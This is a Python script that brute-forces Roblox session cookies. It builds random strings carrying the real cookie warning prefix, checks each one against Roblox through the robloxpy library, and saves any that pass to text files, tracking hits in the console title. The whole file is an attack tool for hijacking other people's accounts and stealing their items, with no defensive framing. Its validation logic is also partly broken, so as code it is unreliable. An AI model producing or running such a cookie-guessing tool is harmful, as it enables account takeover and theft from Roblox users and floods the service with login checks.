import os
import random
import string
import robloxpy
import ctypes
from colorama import init, Fore, Style

init()

def generate_random_cookie(min_length=740, max_length=850):
    length = random.randint(min_length, max_length)
    characters = string.ascii_uppercase + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length - 82))
    cookie = f"|_WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{random_string}"
    return cookie

def validate_cookie(cookie):
    warning = "|_WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    random_string = cookie[len(warning):]
    return robloxpy.Utils.CheckCookie(random_string) == "Valid Cookie"

def generate_unique_filename(base_name):
    filename = base_name.replace('|', '_').replace(':', '_') + ".txt"
    count = 1
    while os.path.exists(filename):
        filename = f"{base_name.replace('|', '_').replace(':', '_')}_{count}.txt"
        count += 1
    return filename

def create_cookie_txt(filename, cookie):
    with open(filename, "w") as file:
        file.write(cookie)

def set_cmd_title(success_count, fail_count):
    ctypes.windll.kernel32.SetConsoleTitleW(f"Success({success_count}) | Failed({fail_count})")

def main():
    num_cookies = int(input("Enter the number of cookies to generate and validate: "))
    success_count = 0
    fail_count = 0
    
    for _ in range(num_cookies):
        while True:
            generated_cookie = generate_random_cookie()
            
            if validate_cookie(generated_cookie):
                filename = generate_unique_filename(generated_cookie[:50])
                create_cookie_txt(filename, generated_cookie)
                print(Fore.GREEN + f"Valid cookie generated and stored as: {filename}")
                print(f"Generated Cookie: {generated_cookie}")
                success_count += 1
                set_cmd_title(success_count, fail_count)
                break
            else:
                print(Fore.RED + f"Invalid cookie generated. Regenerating...")
                print(f"Generated Cookie: {generated_cookie}")
                fail_count += 1
                set_cmd_title(success_count, fail_count)

            print(Style.RESET_ALL)

        set_cmd_title(success_count, fail_count)

if __name__ == "__main__":
    main()
